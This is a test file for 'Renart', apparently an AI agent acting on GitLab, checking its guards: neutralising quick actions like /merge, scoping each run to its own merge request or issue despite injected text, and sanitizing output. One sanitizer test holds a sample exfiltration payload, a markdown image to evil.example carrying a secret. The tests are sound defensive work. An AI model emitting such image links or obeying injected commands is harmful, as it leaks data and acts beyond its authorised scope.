import { test } from 'node:test'
import assert from 'node:assert/strict'
import { renderPrompt } from '../src/prompt.ts'
import { gitlabServer, gitlabTools, noQuickActions, signed, pickTools, tail, sanitize, type GitLabCall } from '../src/tools.ts'

test('renders placeholders and appends the user instruction', () => {
  assert.equal(renderPrompt('MR {{mr.iid}} in {{ project.path }}', { project: 'g/p', mr_iid: 4, instruction: 'en anglais' }),
    "MR 4 in g/p\n\nConsigne de l'utilisateur :\nen anglais")
  assert.throws(() => renderPrompt('issue {{issue.iid}}', { project: 'g/p', mr_iid: 4 }), /issue\.iid/)
})

test('registers only the workflow tools and rejects unknown ones', () => {
  const call: GitLabCall = async () => null
  assert.deepEqual(gitlabServer(call, ['get_merge_request']).allowedTools, ['mcp__gitlab__get_merge_request'])
  assert.throws(() => gitlabServer(call, ['delete_project']), /unknown tools/)
})

test('create_merge_request commits through the runner and always opens a draft', async () => {
  const calls: unknown[] = []
  const pushed: unknown[] = []
  const mr = {
    workspace: { baseBranch: 'main', commitAndPush: async (...a: unknown[]) => { pushed.push(a) }, mergeFrom: async () => [] },
    branch: 'renart/run-1', author: { name: 'Alice', email: 'a@x' },
  }
  const tools = gitlabTools(async (method, path, body) => { calls.push({ method, path, body }); return { iid: 1 } }, mr, undefined, { mr_iid: 1, issue_iid: 1, pipeline_id: 5 })
  await tools.create_merge_request.handler({ title: 'Draft: fix', description: 'd' }, {})
  assert.deepEqual(pushed, [['renart/run-1', 'fix', { name: 'Alice', email: 'a@x' }]])
  assert.deepEqual(calls, [{ method: 'POST', path: '/merge_requests', body: { source_branch: 'renart/run-1', target_branch: 'main', remove_source_branch: true, title: 'Draft: fix', description: 'd\n\n> Pipeline non lancée automatiquement : lancez-la depuis cette MR après relecture.' } }])
  assert.throws(() => gitlabServer(async () => null, ['create_merge_request']), /workspace: true/)
})

test('quick actions in anything the agent writes are neutralised', async () => {
  assert.equal(noQuickActions('ok\n/merge\n  /approve now\nurl a/b'), 'ok\n\u200B/merge\n  \u200B/approve now\nurl a/b')
  const bodies: unknown[] = []
  const tools = gitlabTools(async (_m, _p, body) => { bodies.push(body); return {} }, undefined, undefined, { mr_iid: 1, issue_iid: 1, pipeline_id: 5 })
  await tools.comment_merge_request.handler({ iid: 1, body: 'LGTM\n/merge' }, {})
  await tools.comment_issue.handler({ iid: 1, body: '/close' }, {})
  await tools.comment_diff_line.handler({ iid: 1, body: '/approve', base_sha: 'a', head_sha: 'b', start_sha: 'c', old_path: 'f', new_path: 'f', new_line: 1, old_line: undefined }, {})
  assert.ok(bodies.every((b) => !/^\s*\//m.test((b as { body: string }).body)))
})

test('links point at what each GitLab tool wrote', async () => {
  const { linkFor } = await import('../src/links.ts')
  const ctx = { project: 'g/app', mr_iid: 4, issue_iid: 9 }
  const gl = 'https://gl.example/'
  assert.deepEqual(linkFor('mcp__gitlab__comment_merge_request', { id: 77 }, ctx, gl), { label: 'Commentaire', url: 'https://gl.example/g/app/-/merge_requests/4#note_77' })
  assert.deepEqual(linkFor('mcp__gitlab__comment_diff_line', { notes: [{ id: 5 }] }, ctx, gl)?.url, 'https://gl.example/g/app/-/merge_requests/4#note_5')
  assert.deepEqual(linkFor('mcp__gitlab__comment_issue', { id: 8 }, ctx, gl)?.url, 'https://gl.example/g/app/-/issues/9#note_8')
  assert.deepEqual(linkFor('mcp__gitlab__create_merge_request', { iid: 2, web_url: 'https://gl.example/g/app/-/merge_requests/2' }, ctx, gl), { label: 'Merge request !2', url: 'https://gl.example/g/app/-/merge_requests/2' })
  assert.equal(linkFor('mcp__gitlab__get_issue', { id: 1 }, ctx, gl), null)
  assert.equal(linkFor('Read', {}, ctx, gl), null)
})

test('everything Renart writes is signed with who launched it, without pinging them', async () => {
  const by = { username: 'alice', name: 'Alice *Doe*', email: 'a@x' }
  const bodies: string[] = []
  const tools = gitlabTools(async (_m, _p, body) => { bodies.push((body as { body: string }).body); return {} }, undefined, by, { mr_iid: 1, issue_iid: 1, pipeline_id: 5 })
  await tools.comment_issue.handler({ iid: 1, body: 'Plan\n/close' }, {})
  assert.equal(bodies[0], 'Plan\n\u200B/close\n\n---\n_Lancé par Alice Doe (`@alice`) via Renart_')
})

test('a signature copied by the model is dropped; only the true one remains', () => {
  const by = { username: 'demo', name: 'Rayane', email: 'r@x' }
  const out = signed('Revue.\n\n---\n_Lancé par Alice Martin (`@alice`) via Renart_', by)
  assert.equal(out, 'Revue.\n\n---\n_Lancé par Rayane (`@demo`) via Renart_')
  assert.equal((out.match(/Lancé par/g) ?? []).length, 1)
})

test('graph tools call the orchestrator with the run token; they only exist when the run has a graph', async () => {
  const asked: unknown[] = []
  const tools = pickTools(async () => ({}), ['code_graph_callers', 'code_graph_affected'], undefined, undefined, async (tool, args) => { asked.push({ tool, args }); return 'average calc.py:5' })
  const out = await tools[0].handler({ symbol: 'divide' }, {})
  await tools[1].handler({ files: ['calc.py'] }, {})
  assert.deepEqual(asked, [{ tool: 'code_graph_callers', args: { symbol: 'divide' } }, { tool: 'code_graph_affected', args: { files: ['calc.py'] } }])
  assert.deepEqual(out.content, [{ type: 'text', text: 'average calc.py:5' }])
  assert.throws(() => pickTools(async () => ({}), ['code_graph_explore']), /unknown tools/)
})

test('pipeline placeholders', () => {
  assert.equal(renderPrompt('{{pipeline.id}} on {{pipeline.branch}}', { project: 'g/p', pipeline_id: 9, branch: 'feat' }), '9 on feat')
})

test('get_pipeline: failed jobs with the clean end of their log, and the merge request of the branch', async () => {
  const paths: string[] = []
  const call: GitLabCall = async (_m, path) => {
    paths.push(path)
    if (path === '/pipelines/5') return { ref: 'feat', sha: 'abc', status: 'failed', web_url: 'u' }
    if (path.startsWith('/pipelines/5/jobs')) return [
      { id: 1, name: 'lint', stage: 'test', status: 'success', allow_failure: false },
      { id: 2, name: 'unit', stage: 'test', status: 'failed', failure_reason: 'script_failure', allow_failure: false },
      { id: 3, name: 'flaky', stage: 'test', status: 'failed', allow_failure: true },
    ]
    if (path === '/jobs/2/trace') return 'section_start:1:step_script\r\x1b[0K\x1b[31mFAILED test_x\x1b[0m\nexit 1\n'
    if (path.startsWith('/merge_requests?')) return [{ iid: 12 }]
    throw new Error(path)
  }
  const out = JSON.parse(((await gitlabTools(call, undefined, undefined, { mr_iid: 1, issue_iid: 1, pipeline_id: 5 }).get_pipeline.handler({ id: 5 }, {})).content[0] as { text: string }).text)
  assert.equal(out.merge_request_iid, 12)
  assert.deepEqual(out.failed_logs.map((l: { job: string }) => l.job), ['unit'], 'allowed failures are not the problem')
  assert.match(out.failed_logs[0].log_end, /^\s*FAILED test_x\nexit 1/)
  assert.ok(!paths.includes('/jobs/3/trace'))
  assert.ok(paths.some((p) => p.includes('source_branch=feat')))
})

test('tail keeps the last lines and splits progress-bar carriage returns', () => {
  assert.equal(tail('a\nb\nc\nd', 2), 'c\nd')
  assert.equal(tail('10%\r50%\r100%', 1), '100%')
})

test('get_discussions returns the unresolved review threads only', async () => {
  const note = (body: string, extra: object = {}) => ({ body, system: false, resolvable: true, resolved: false, author: { username: 'bob' }, ...extra })
  const call: GitLabCall = async () => [
    { id: 'd1', notes: [note('Renomme ça', { position: { new_path: 'a.py', new_line: 3 } }), note('ok', { author: { username: 'alice' } })] },
    { id: 'd2', notes: [note('fait', { resolved: true })] },
    { id: 'd3', notes: [{ ...note('changed the description'), system: true }] },
    { id: 'd4', notes: [{ ...note('merci !'), resolvable: false }] },
  ]
  const out = JSON.parse(((await gitlabTools(call, undefined, undefined, { mr_iid: 1, issue_iid: 1, pipeline_id: 5 }).get_discussions.handler({ iid: 1 }, {})).content[0] as { text: string }).text)
  assert.equal(out.resolved_count, 1)
  assert.deepEqual(out.unresolved, [{ discussion_id: 'd1', file: 'a.py', line: 3, notes: [{ author: 'bob', body: 'Renomme ça' }, { author: 'alice', body: 'ok' }] }])
})

test('merge_target_branch needs a workspace and merges the MR target branch', async () => {
  assert.throws(() => pickTools(async () => null, ['merge_target_branch']), /workspace: true/)
  const merged: string[] = []
  const mr = { workspace: { baseBranch: 'feat', commitAndPush: async () => {}, mergeFrom: async (t: string) => { merged.push(t); return ['a.txt'] } }, branch: 'renart/run-1', author: { name: 'A', email: 'a@x' } }
  const out = await gitlabTools(async () => ({ target_branch: 'main' }), mr, undefined, { mr_iid: 1, issue_iid: 1, pipeline_id: 5 }).merge_target_branch.handler({ iid: 1 }, {})
  assert.deepEqual(merged, ['main'])
  assert.deepEqual(JSON.parse((out.content[0] as { text: string }).text), { target_branch: 'main', conflicts: ['a.txt'] })
})

test('a run only touches its own MR, issue or pipeline, whatever the text it read asks', async () => {
  const call: GitLabCall = async (_m, path) => {
    if (path === '/pipelines/5') return { ref: 'refs/merge-requests/3/head' }
    if (path === '/pipelines/9') return { ref: 'other' }
    if (path === '/jobs/7') return { pipeline: { id: 5 } }
    if (path === '/jobs/8') return { pipeline: { id: 9 } }
    if (path.startsWith('/merge_requests?') || path.includes('/jobs?')) return []
    return { iid: 3, id: 1 }
  }
  const onMr = gitlabTools(call, undefined, undefined, { mr_iid: 3 })
  await onMr.comment_merge_request.handler({ iid: 3, body: 'ok' }, {})
  await assert.rejects(onMr.comment_merge_request.handler({ iid: 4, body: 'leak' }, {}), /outside this run/)
  await assert.rejects(onMr.get_issue.handler({ iid: 7 }, {}), /outside this run/)
  await onMr.get_pipeline.handler({ id: 5 }, {}) // a pipeline of this MR
  await assert.rejects(onMr.get_pipeline.handler({ id: 9 }, {}), /outside this run/)
  const onPipeline = gitlabTools(call, undefined, undefined, { pipeline_id: 5 })
  await onPipeline.get_job_log.handler({ job_id: 7 }, {})
  await assert.rejects(onPipeline.get_job_log.handler({ job_id: 8 }, {}), /outside this run/)
  await onPipeline.comment_merge_request.handler({ iid: 3, body: 'cause' }, {}) // the pipeline's MR
})

test('what the bot writes loads no outside image, pings no crowd and closes only its own issue', () => {
  assert.equal(sanitize('![x](https://evil.example/?d=secret) <img src=//e/a> @all'), 'x  @\u200Ball')
  assert.equal(sanitize('Closes #4, fixes #9', { issue_iid: 4 }), 'Closes #4, fixes\u200B #9')
})
